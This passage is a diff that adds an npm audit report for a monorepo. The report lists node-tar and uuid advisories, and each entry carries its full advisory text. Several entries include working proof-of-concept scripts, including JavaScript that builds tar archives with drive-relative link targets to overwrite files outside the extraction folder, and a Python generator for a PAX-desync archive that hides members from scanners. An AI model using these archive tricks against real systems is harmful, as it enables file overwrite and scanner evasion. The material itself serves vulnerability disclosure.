user.\n\nPotential outcomes:\n\n- Read sensitive files reachable by the process user.\n- Overwrite writable files outside extraction root.\n- Escalate impact depending on deployment context (keys, configs, scripts, app data).",
+      "reported_by": null,
+      "title": "Arbitrary File Read/Write via Hardlink Target Escape Through Symlink Chain in node-tar Extraction",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-26960"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<7.5.8",
+      "github_advisory_id": "GHSA-83g3-92jg-28cx",
+      "recommendation": "Upgrade to version 7.5.8 or later",
+      "patched_versions": ">=7.5.8",
+      "updated": "2026-02-20T16:47:50.000Z",
+      "cvss": {
+        "score": 7.1,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-83g3-92jg-28cx"
+    },
+    "1114200": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\desktop > fabric@6.9.1 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1",
+            "apps\\desktop > fabric@6.9.1 > jsdom@20.0.3 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-qffp-2rhf-9h96\n- https://github.com/isaacs/node-tar/commit/7bc755dd85e623c0279e08eb3784909e6d7e4b9f\n- https://nvd.nist.gov/vuln/detail/CVE-2026-29786\n- https://github.com/advisories/GHSA-qffp-2rhf-9h96",
+      "created": "2026-03-05T00:52:32.000Z",
+      "id": 1114200,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`tar` (npm) can be tricked into creating a hardlink that points outside the extraction directory by using a drive-relative link target such as `C:../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.\n\n### Details\nThe extraction logic in `Unpack[STRIPABSOLUTEPATH]` checks for `..` segments *before* stripping absolute roots.\n\nWhat happens with `linkpath: \"C:../target.txt\"`:\n1. Split on `/` gives `['C:..', 'target.txt']`, so `parts.includes('..')` is false.\n2. `stripAbsolutePath()` removes `C:` and rewrites the value to `../target.txt`.\n3. Hardlink creation resolves this against extraction `cwd` and escapes one directory up.\n4. Writing through the extracted hardlink overwrites the outside file.\n\nThis is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.\n\n### PoC\nTested on Arch Linux with `tar@7.5.9`.\n\nPoC script (`poc.cjs`):\n\n```js\nconst fs = require('fs')\nconst path = require('path')\nconst { Header, x } = require('tar')\n\nconst cwd = process.cwd()\nconst target = path.resolve(cwd, '..', 'target.txt')\nconst tarFile = path.join(process.cwd(), 'poc.tar')\n\nfs.writeFileSync(target, 'ORIGINAL\\n')\n\nconst b = Buffer.alloc(1536)\nnew Header({ path: 'l', type: 'Link', linkpath: 'C:../target.txt' }).encode(b, 0)\nfs.writeFileSync(tarFile, b)\n\nx({ cwd, file: tarFile }).then(() => {\n  fs.writeFileSync(path.join(cwd, 'l'), 'PWNED\\n')\n  process.stdout.write(fs.readFileSync(target, 'utf8'))\n})\n```\n\nRun:\n\n```bash\ncd test-workspace\nnode poc.cjs && ls -l ../target.txt\n```\n\nObserved output:\n\n```text\nPWNED\n-rw-r--r-- 2 joshuavr joshuavr 6 Mar  4 19:25 ../target.txt\n```\n\n`PWNED` confirms outside file content overwrite. Link count `2` confirms the extracted file and `../target.txt` are hardlinked.\n\n### Impact\nThis is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.\n\nRealistic scenarios:\n- CLI tools unpacking untrusted tarballs into a working directory\n- build/update pipelines consuming third-party archives\n- services that import user-supplied tar files",
+      "reported_by": null,
+      "title": "tar has Hardlink Path Traversal via Drive-Relative Linkpath",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-29786"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.9",
+      "github_advisory_id": "GHSA-qffp-2rhf-9h96",
+      "recommendation": "Upgrade to version 7.5.10 or later",
+      "patched_versions": ">=7.5.10",
+      "updated": "2026-03-09T15:49:59.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-59"
+      ],
+      "url": "https://github.com/advisories/GHSA-qffp-2rhf-9h96"
+    },
+    "1114302": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\desktop > fabric@6.9.1 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1",
+            "apps\\desktop > fabric@6.9.1 > jsdom@20.0.3 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-9ppj-qmqm-q256\n- https://nvd.nist.gov/vuln/detail/CVE-2026-31802\n- https://github.com/isaacs/node-tar/commit/f48b5fa3b7985ddab96dc0f2125a4ffc9911b6ad\n- https://github.com/advisories/GHSA-9ppj-qmqm-q256",
+      "created": "2026-03-10T23:44:58.000Z",
+      "id": 1114302,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`tar` (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as `C:../../../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.\n\n### Details\nThe extraction logic in `Unpack[STRIPABSOLUTEPATH]` validates `..` segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored `linkpath` to the stripped value.\n\nWhat happens with `linkpath: \"C:../../../target.txt\"`:\n1. `stripAbsolutePath()` removes `C:` and rewrites the value to `../../../target.txt`.\n2. The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.\n3. Symlink creation uses the rewritten value (`../../../target.txt`) from nested path `a/b/l`.\n4. Writing through the extracted symlink overwrites the outside file (`../target.txt`).\n\nThis is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.\n\n### PoC\nTested on Arch Linux with `tar@7.5.10`.\n\nPoC script (`poc.cjs`):\n\n```js\nconst fs = require('fs')\nconst path = require('path')\nconst { Header, x } = require('tar')\n\nconst cwd = process.cwd()\nconst target = path.resolve(cwd, '..', 'target.txt')\nconst tarFile = path.join(cwd, 'poc.tar')\n\nfs.writeFileSync(target, 'ORIGINAL\\n')\n\nconst b = Buffer.alloc(1536)\nnew Header({\n  path: 'a/b/l',\n  type: 'SymbolicLink',\n  linkpath: 'C:../../../target.txt',\n}).encode(b, 0)\nfs.writeFileSync(tarFile, b)\n\nx({ cwd, file: tarFile }).then(() => {\n  fs.writeFileSync(path.join(cwd, 'a/b/l'), 'PWNED\\n')\n  process.stdout.write(fs.readFileSync(target, 'utf8'))\n})\n```\n\nRun:\n\n```bash\nnode poc.cjs && readlink a/b/l && ls -l a/b/l ../target.txt\n```\n\nObserved output:\n\n```text\nPWNED\n../../../target.txt\nlrwxrwxrwx - joshuavr  7 Mar 18:37 󰡯 a/b/l -> ../../../target.txt\n.rw-r--r-- 6 joshuavr  7 Mar 18:37  ../target.txt\n```\n\n`PWNED` confirms outside file content overwrite. `readlink` and `ls -l` confirm the extracted symlink points outside the extraction directory.\n\n### Impact\nThis is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.\n\nRealistic scenarios:\n- CLI tools unpacking untrusted tarballs into a working directory\n- build/update pipelines consuming third-party archives\n- services that import user-supplied tar files",
+      "reported_by": null,
+      "title": "node-tar Symlink Path Traversal via Drive-Relative Linkpath",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-31802"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.10",
+      "github_advisory_id": "GHSA-9ppj-qmqm-q256",
+      "recommendation": "Upgrade to version 7.5.11 or later",
+      "patched_versions": ">=7.5.11",
+      "updated": "2026-03-10T23:44:59.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-9ppj-qmqm-q256"
+    },
+    "1114680": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\desktop > fabric@6.9.1 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1",
+            "apps\\desktop > fabric@6.9.1 > jsdom@20.0.3 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-r6q2-hw4h-h46w\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23950\n- https://github.com/isaacs/node-tar/commit/3b1abfae650056edfabcbe0a0df5954d390521e6\n- https://github.com/advisories/GHSA-r6q2-hw4h-h46w",
+      "created": "2026-01-21T01:05:49.000Z",
+      "id": 1114680,
+      "npm_advisory_id": null,
+      "overview": "**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS\n\n**AUTHOR**: Tomás Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" > collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" > collision_test_ß\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_ß\"\nconst header2 = new tar.Header({\n    path: 'collision_ß',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () => {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f => {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-] No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---",
+      "reported_by": null,
+      "title": "Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-23950"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.3",
+      "github_advisory_id": "GHSA-r6q2-hw4h-h46w",
+      "recommendation": "Upgrade to version 7.5.4 or later",
+      "patched_versions": ">=7.5.4",
+      "updated": "2026-03-16T14:23:27.000Z",
+      "cvss": {
+        "score": 8.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L"
+      },
+      "cwe": [
+        "CWE-176",
+        "CWE-367"
+      ],
+      "url": "https://github.com/advisories/GHSA-r6q2-hw4h-h46w"
+    },
+    "1119441": {
+      "findings": [
+        {
+          "version": "8.3.2",
+          "paths": [
+            ". > exceljs@4.4.0 > uuid@8.3.2",
+            "apps\\api > exceljs@4.4.0 > uuid@8.3.2"
+          ]
+        },
+        {
+          "version": "9.0.1",
+          "paths": [
+            "apps\\api > firebase-admin@13.10.0 > @google-cloud/firestore@7.11.6 > google-gax@4.6.1 > google-auth-library@9.15.1 > gaxios@6.7.1 > uuid@9.0.1",
+            "apps\\api > firebase-admin@13.10.0 > @google-cloud/firestore@7.11.6 > google-gax@4.6.1 > google-auth-library@9.15.1 > gcp-metadata@6.1.1 > gaxios@6.7.1 > uuid@9.0.1",
+            "apps\\api > firebase-admin@13.10.0 > @google-cloud/firestore@7.11.6 > google-gax@4.6.1 > google-auth-library@9.15.1 > gtoken@7.1.0 > gaxios@6.7.1 > uuid@9.0.1",
+            "apps\\api > firebase-admin@13.10.0 > @google-cloud/firestore@7.11.6 > google-gax@4.6.1 > retry-request@7.0.2 > teeny-request@9.0.0 > uuid@9.0.1",
+            "apps\\api > firebase-admin@13.10.0 > @google-cloud/firestore@7.11.6 > google-gax@4.6.1 > uuid@9.0.1",
+            "apps\\api > firebase-admin@13.10.0 > @google-cloud/storage@7.22.0 > gaxios@6.7.1 > uuid@9.0.1",
+            "apps\\api > firebase-admin@13.10.0 > @google-cloud/storage@7.22.0 > google-auth-library@9.15.1 > gaxios@6.7.1 > uuid@9.0.1",
+            "apps\\api > firebase-admin@13.10.0 > @google-cloud/storage@7.22.0 > google-auth-library@9.15.1 > gcp-metadata@6.1.1 > gaxios@6.7.1 > uuid@9.0.1",
+            "apps\\api > firebase-admin@13.10.0 > @google-cloud/storage@7.22.0 > google-auth-library@9.15.1 > gtoken@7.1.0 > gaxios@6.7.1 > uuid@9.0.1",
+            "apps\\api > firebase-admin@13.10.0 > @google-cloud/storage@7.22.0 > retry-request@7.0.2 > teeny-request@9.0.0 > uuid@9.0.1",
+            "apps\\api > firebase-admin@13.10.0 > @google-cloud/storage@7.22.0 > teeny-request@9.0.0 > uuid@9.0.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq\n- https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34\n- https://github.com/uuidjs/uuid/releases/tag/v14.0.0\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41907\n- https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e\n- https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d\n- https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a\n- https://github.com/uuidjs/uuid/releases/tag/v11.1.1\n- https://github.com/uuidjs/uuid/releases/tag/v12.0.1\n- https://github.com/uuidjs/uuid/releases/tag/v13.0.1\n- https://github.com/advisories/GHSA-w5hq-g745-h8pq",
+      "created": "2026-04-22T20:53:24.000Z",
+      "id": 1119441,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+      "reported_by": null,
+      "title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41907"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "uuid",
+      "vulnerable_versions": "<11.1.1",
+      "github_advisory_id": "GHSA-w5hq-g745-h8pq",
+      "recommendation": "Upgrade to version 11.1.1 or later",
+      "patched_versions": ">=11.1.1",
+      "updated": "2026-05-21T18:25:57.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-787",
+        "CWE-1285"
+      ],
+      "url": "https://github.com/advisories/GHSA-w5hq-g745-h8pq"
+    },
+    "1120782": {
+      "findings": [
+        {
+          "version": "6.2.1",
+          "paths": [
+            "apps\\desktop > fabric@6.9.1 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1",
+            "apps\\desktop > fabric@6.9.1 > jsdom@20.0.3 > canvas@2.11.2 > @mapbox/node-pre-gyp@1.0.11 > tar@6.2.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-vmf3-w455-68vh\n- https://github.com/advisories/GHSA-vmf3-w455-68vh",
+      "created": "2026-06-15T17:19:42.000Z",
+      "id": 1120782,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`tar` (node-tar) applies a PAX extended header's `size=` record (and other PAX\noverrides) to the **next header entry of any type**, including intermediary\nmetadata headers such as a GNU long-name (`L`) or long-link (`K`) entry. Per\nPOSIX pax, a PAX extended header (`x`) describes the *next file entry*, not the\nintermediary extension headers that may sit between the `x` header and the file\nit annotates. Because node-tar lets the PAX `size` override the byte length of\nan intervening `L`/`K`/`x` header, an attacker can desynchronize node-tar's\nstream cursor relative to every other mainstream tar implementation\n(GNU tar, libarchive/bsdtar, Python `tarfile`, and the now-fixed `tar-rs` /\n`astral-tokio-tar`).\n\nThe result is a tar parser **interpretation differential** (CWE-436): a single\ncrafted archive yields a different set of members under node-tar than under the\nreference tar tools. An attacker can use this to hide a member from one parser\nwhile it is visible to another, which defeats security tooling whose scanner and\nextractor disagree on archive contents (e.g. a malware/secret scanner that lists\nentries with one library while a downstream step extracts with another). node-tar\nis one of the most widely deployed JavaScript tar libraries (it backs `npm`'s own\npackage-tarball handling and is a transitive dependency of a very large fraction\nof the npm ecosystem), so the blast radius for \"files that extract differently\ndepending on the tool\" is broad.\n\nThis is the same root cause and fix that was just addressed upstream in the Rust\ntar ecosystem (`tar-rs` / `astral-tokio-tar`); node-tar carries the equivalent\ndefect and has no equivalent guard.\n\n### Impact\n\n- CWE-436 Interpretation Conflict / inconsistent tar parsing (the same class as\n  the prior tar \"smuggling\" advisories GHSA-j5gw-2vrg-8fgx and\n  GHSA-fp55-jw48-c537).\n- A crafted archive can present one logical member list to a tool that lists or\n  scans with node-tar and a different member list to GNU tar / libarchive /\n  Python tarfile (and vice versa). This lets a malicious file be hidden from a\n  scanner that uses a different parser than the eventual extractor, or hidden\n  from node-tar-based inspection while still landing on disk via a system `tar`.\n- No authentication is required; the only precondition is that a victim parses\n  an attacker-supplied tar with node-tar. Tar archives are routinely fetched\n  from untrusted sources (package registries, user uploads, CI artifacts,\n  container layers).\n- Severity: Medium. Impact is integrity-of-archive-interpretation, not direct\n  RCE; it is a building block for supply-chain / scanner-evasion attacks rather\n  than a standalone code-execution primitive.\n\n### Vulnerable code (file:line)\n\n`src/header.ts` (compiled to `dist/esm/header.js:49` and\n`dist/commonjs/header.js:85` in the published `tar@7.5.15`):\n\n```ts\n// Header.decode(buf, off, ex, gex)\nthis.size = ex?.size ?? gex?.size ?? decNumber(buf, off + 124, 12)\n```\n\n`ex` is the currently-accumulated PAX **local** extended header and `gex` the\nPAX **global** header. The `size` override from `ex`/`gex` is applied\nunconditionally to whatever header is being decoded next — there is no check\nthat the header being decoded is a real *file* entry rather than an intermediary\nextension header.\n\n`src/parse.ts`, `[CONSUMEHEADER]` constructs the next header with the current\n`EX`/`GEX` applied:\n\n```ts\nconst header = new Header(chunk, position, this[EX], this[GEX])\n```\n\nand later branches on whether that header is a metadata entry. `this[EX]` is\ncleared only in the non-meta (real file) branch:\n\n```ts\nif (entry.meta) {\n  // L / K / x / g metadata entries: this[EX] is left intact here\n  if (entry.size > this.maxMetaEntrySize) {\n    entry.ignore = true\n    this[STATE] = 'ignore'\n    entry.resume()\n  } else if (entry.size > 0) {\n    this[META] = ''\n    entry.on('data', c => (this[META] += c))\n    this[STATE] = 'meta'\n  }\n} else {\n  this[EX] = undefined   // EX cleared only once a real file entry is reached\n}\n```\n\nWhen the stream is ordered `x (PAX, size=N) -> L (GNU long-name) -> file`, the\n`L` header is constructed with `this[EX]` still set, so its `size`/`remain`\nbecomes `N` instead of the `L` payload's true length. node-tar then consumes `N`\nbytes of \"metadata\" and resumes header parsing at the wrong offset, landing\nmid-stream. Every other mainstream parser applies the PAX `size` only to the\nfollowing *file* entry, so they stay synchronized.\n\nThe correct behavior (and the fix shipped upstream in the Rust tar ecosystem) is\nto **not** apply PAX `size`/overrides when the entry being decoded is itself an\nextension header (`L` GNU long-name, `K` GNU long-link, `x` PAX local, `g` PAX\nglobal).\n\n### How input reaches the sink\n\n`tar.list()`, `tar.extract()`/`tar.x()`, and `tar.Parse`/`tar.Unpack` all route\nevery 512-byte header block through `Header.decode(...)` with the\ncurrently-accumulated `EX`/`GEX`. Any consumer that parses an attacker-supplied\narchive — `tar.list`, `tar.extract`, or piping into the streaming `Parser` —\nreaches the sink. No options need to be enabled; the default code path is\naffected.\n\n### Proof of concept\n\nArchive layout (all standard, GNU-tar-producible blocks):\n\n```\nblock 0 : x  header  (PAX local extended, typeflag 'x'), its own size = len(pax body)\nblock 1 : x  payload : the single PAX record  \"...size=2048\\n\"\nblock 2 : L  header  (GNU long-name '././@LongLink'), real size = 13\nblock 3 : L  payload : \"longname.txt\\0\"      (the long name for the next file)\nblock 4 : file header 'file_a', size = 16\nblock 5 : file_a body (16 bytes, zero-padded to 512)\nblock 6 : file header 'file_b', size = 16\nblock 7 : file_b body (16 bytes, zero-padded to 512)\n```\n\nGenerator (`make_tar.py`, pure stdlib, no external deps):\n\n```python\ndef hdr(name, size, typeflag):\n    h = bytearray(512); name = name[:100]; h[0:len(name)] = name\n    h[100:108] = b'0000644\\0'; h[108:116] = b'0000000\\0'; h[116:124] = b'0000000\\0'\n    h[124:136] = ('%011o\\0' % size).encode(); h[136:148] = b'00000000000\\0'\n    h[156:157] = typeflag; h[257:263] = b'ustar\\0'; h[263:265] = b'00'\n    h[148:156] = b' ' * 8\n    cs = sum(h); h[148:156] = ('%06o\\0 ' % cs).encode()\n    return bytes(h)\n\ndef pad(d):\n    return d + b'\\0' * ((512 - len(d) % 512) % 512)\n\ndef pax_record(key, val):              # length-prefixed PAX record \"LEN key=val\\n\"\n    body = b' %s=%s\\n' % (key.encode(), str(val).encode()); n = len(body)\n    while True:\n        s = str(n).encode() + body\n        if len(s) == n: break\n        n = len(s)\n    return s\n\npax = pax_record('size', 2048)         # malicious: claim size=2048 for the \"next\" entry\nout  = hdr(b'PaxHeaders/x', len(pax), b'x') + pad(pax)\nout += hdr(b'././@LongLink', 13, b'L') + pad(b'longname.txt\\0')\nout += hdr(b'file_a', 16, b'0')        + pad(b'AAAA_file_a_body')\nout += hdr(b'file_b', 16, b'0')        + pad(b'BBBB_file_b_body')\nout += b'\\0' * 1024\nopen('pax-desync.tar', 'wb').write(out)\n```\n\nA negative-control archive is identical except the PAX record is\n`pax_record('comment', 'x')` (no `size=`), written to `pax-control.tar`.\n\n### End-to-end reproduction (against pinned version `tar@7.5.15`, latest release)\n\nInstall the published package into a clean project and parse both archives:\n\n```\n$ npm init -y >/dev/null && npm install tar@7.5.15\n$ node -e \"console.log(require('tar/package.json').version)\"\n7.5.15\n$ grep -n \"ex?.size ?? gex?.size\" node_modules/tar/dist/esm/header.js\n49:        this.size = ex?.size ?? gex?.size ?? decNumber(buf, off + 124, 12);\n```\n\n`e2e.mjs`:\n\n```js\nimport * as tar from 'tar'\nasync function listEntries(f){\n  const got=[], warns=[]\n  await tar.list({ file:f, onReadEntry:e=>{ got.push({path:e.path,size:e.size,type:e.type}); e.resume() },\n                   onwarn:(code,_msg)=>warns.push(code) })\n  return { got, warns }\n}\nconst mal = await listEntries('pax-desync.tar')\nconsole.log('MALICIOUS entries :', JSON.stringify(mal.got), 'warnings:', JSON.stringify(mal.warns))\nconst ctl = await listEntries('pax-control.tar')\nconsole.log('CONTROL  entries :', JSON.stringify(ctl.got), 'warnings:', JSON.stringify(ctl.warns))\n```\n\nVerbatim output:\n\n```\n=== Deployed-consumer E2E: npm tar@7.5.15 (latest release) ===\n\n[MALICIOUS] archive = x(PAX size=2048) -> L(GNU longname \"longname.txt\") -> file_a(16B) -> file_b(16B)\n  tar.list() entries : []\n  tar.list() warnings: [\"TAR_ENTRY_INVALID\"]\n\n[NEGATIVE CONTROL] same archive, PAX record is \"comment=x\" (no size= override)\n  tar.list() entries : [{\"path\":\"longname.txt\",\"size\":16,\"type\":\"File\"},{\"path\":\"file_b\",\"size\":16,\"type\":\"File\"}]\n  tar.list() warnings: []\n```\n\nReference parsers on the **same** `pax-desync.tar`:\n\n```\n$ tar tvf pax-desync.tar\n-rw-r--r--  0 0      0        2048 Jan  1  1970 longname.txt          # GNU tar\n\n$ bsdtar tvf pax-desync.tar\n-rw-r--r--  0 0      0        2048 Jan  1  1970 longname.txt          # libarchive\n\n$ python3 -c \"import tarfile; print([m.name for m in tarfile.open('pax-desync.tar').getmembers()])\"\n['longname.txt']                                                      # Python tarfile\n```\n\nInterpretation differential: GNU tar, libarchive (bsdtar), and Python `tarfile`\nall extract the member `longname.txt` from `pax-desync.tar`, whereas node-tar\n`7.5.15` desynchronizes, raises `TAR_ENTRY_INVALID` (checksum failure from\nlanding mid-stream), and reports **zero** members. The negative control proves\nthe divergence is caused solely by the PAX `size=` override being applied to the\nintermediary `L` header — when the same archive carries a PAX record without\n`size=`, node-tar parses it identically to the reference 